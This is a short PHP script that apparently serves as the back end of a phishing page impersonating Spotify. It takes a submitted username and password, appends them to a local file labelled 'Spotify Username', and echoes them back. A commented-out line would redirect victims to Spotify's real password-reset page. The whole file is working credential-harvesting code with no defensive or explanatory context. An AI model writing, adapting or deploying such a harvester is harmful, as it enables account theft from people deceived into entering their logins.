<?php
$decoded = json_decode(file_get_contents('php://input'),true);
file_put_contents("usernames.txt", "Spotify Username: " . $decoded['username'] . "\nPassword: " . $decoded['password'] . "\n", FILE_APPEND);
echo $decoded['username'].$decoded['password'];
#header('Location: https://www.spotify.com/password-reset/');
exit();
?>